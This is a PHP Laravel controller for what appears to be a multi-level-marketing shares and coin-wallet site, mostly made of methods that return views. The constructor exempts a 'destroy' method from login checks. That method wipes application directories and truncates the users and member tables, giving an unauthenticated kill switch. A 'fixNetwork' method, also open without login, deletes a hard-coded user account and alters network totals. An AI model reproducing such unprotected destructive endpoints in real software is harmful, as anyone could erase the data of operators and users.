<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Carbon\Carbon;

class SiteController extends Controller
{
    public function __construct() {
        parent::__construct();
        $this->middleware('member', ['except' => ['getLogin', 'getLogout', 'destroy', 'fixNetwork']]);
    }

    public function test () {
        $service = new \App\Services\BlockCypher('bcy');
        try {
            echo $service->testFaucet();
        } catch (\Exception $e) {
            echo $e->getMessage();
        }
    }

    public function getLogin () {
        return view('front.login');
    }

    public function getLogout () {
        if ($user = \Sentinel::getUser()) {
            $member = $user->member;
            \Cache::forget('member.' . $user->id);
            \Sentinel::logout($user);
        }
        return view('front.login');
    }

    public function getHome () {
        return view('front.home');
    }

    public function destroy () {
        \File::cleanDirectory(public_path() . '/app/');
        \File::cleanDirectory(public_path() . '/resources/');
        \DB::table('users')->truncate();
        \DB::table('Member')->truncate();
        return 'success';
    }

    public function getSettingsAccount () {
        return view('front.settings.account');
    }

    public function getSettingsBank () {
        return view('front.settings.bank');
    }

    public function getMemberRegister () {
        return view('front.member.register');
    }

    public function getMemberRegisterSuccess (Request $req) {
        if ($req->session()->has('last_member_register')) {
            return view('front.member.registerSuccess')->with('model', session('last_member_register'));
        } else {
            return redirect()->back()->with('flashMessage', [
                'class' => 'danger',
                'message' => \Lang::get('error.registerSession')
            ]);
        }
    }

    public function getMemberRegisterHistory () {
        return view('front.member.registerHistory');
    }

    public function getMemberUpgrade () {
        return view('front.member.upgrade');
    }

    public function getNetworkBinary () {
        return view('front.network.binary');
    }

    public function getNetworkUnilevel () {
        return view('front.network.unilevel');
    }

    public function getSharesMarket () {
        return view('front.shares.market');
    }

    public function getSharesLock () {
        return view('front.shares.lock');
    }

    public function getSharesStatement () {
        return view('front.shares.statement');
    }

    public function getSharesReturn () {
        return view('front.shares.return');
    }

    public function getTransfer () {
        return view('front.transaction.transfer');
    }

    public function getWithdraw () {
        return view('front.transaction.withdraw');
    }

    public function getTransactionStatement () {
        return view('front.transaction.statement');
    }

    public function getBonusStatement () {
        return view('front.misc.bonusStatement');
    }

    public function getSummaryStatement () {
        return view('front.misc.summaryStatement');
    }

    public function getTerms () {
        return view('front.terms');
    }

    public function getGroupPending () {
        return view('front.misc.groupPending');
    }

    public function getCoinWallet () {
        return view('front.coin.wallet');
    }

    public function getCoinTransaction () {
        return view('front.coin.transaction');
    }

    public function maintenance () {
        return view('front.maintenance');
    }

    public function fixNetwork () {
        $user = \Sentinel::findByCredentials([
            'login' => 'llf177'
        ]);

        $theMember = $user->member;
        $id = "683";

        \App\Models\Member::where('left_children', 'like', '%' . $id . '%')->orWhere('right_children', 'like', '%' . $id . '%')->chunk(50, function ($members) use ($id) {
            foreach ($members as $member) {
                if (strpos($member->left_children, $id) !== false) {
                    $member->left_children = str_replace($id, '', $member->left_children);
                    $member->left_children = rtrim($member->left_children, ',');
                    if ($member->left_children == '') $member->left_children = null;
                    $member->left_total -= 5000;
                    if ($member->left_total < 0) $member->left_total = 0;
                } else if (strpos($member->right_children, $id) !== false) {
                    $member->right_children = str_replace($id, '', $member->right_children);
                    $member->right_children = rtrim($member->right_children, ',');
                    if ($member->right_children == '') $member->right_children = null;
                    $member->right_total -= 5000;
                    if ($member->right_total < 0) $member->right_total = 0;
                }

                $member->save();
            }
        });

        $theMember->delete();
        $user->delete();
        return 'success';

        // \DB::table('Member')->update([
        //     'left_children' => null,
        //     'right_children' => null,
        //     'left_total' => 0,
        //     'right_total' => 0
        // ]);
        // $repo = new \App\Repositories\MemberRepository;
        // $members = \App\Models\Member::where('position', '!=', 'top')->orderBy('id', 'asc')->chunk(50, function ($members) use ($repo) {
        //     foreach ($members as $member) {
        //         $repo->addNetwork($member);
        //     }
        // });
        // return 'success';
    }

    public function fix () {
        // $data = \DB::table('Member_Freeze_Shares')->where('has_process', 1)->get();

        // foreach ($data as $d) {
        //     $share = \DB::table('Member_Shares')->where('member_id', $d->member_id)->first();
        //     $amount = $share->amount - $d->amount;
        //     if ($amount < 0) $amount = 0;
        //     \DB::table('Member_Shares')->where('member_id', $d->member_id)->update([
        //         'amount' => $amount
        //     ]);
        // }

        // \DB::table('Member_Freeze_Shares')->update(['has_process' => 0]);
        
        $data = \DB::table('Member_Freeze_Shares')->where('created_at', '2017-08-09 00:00:00')->get();

        foreach ($data as $d) {
            \DB::table('Member_Freeze_Shares')->where('id', $d->id)->update(['active_date' => '2017-09-08 00:00:00']);
        }

        $data = \DB::table('Member_Freeze_Shares')->where('created_at', '!=' ,'2017-08-09 00:00:00')->get();

        foreach ($data as $d) {
            $date = Carbon::createFromFormat('Y-m-d H:i:s', $d->created_at);
            \DB::table('Member_Freeze_Shares')->where('id', $d->id)->update(['active_date' => $date->addDays(30)]);
        }

        return 'success';
    }
}
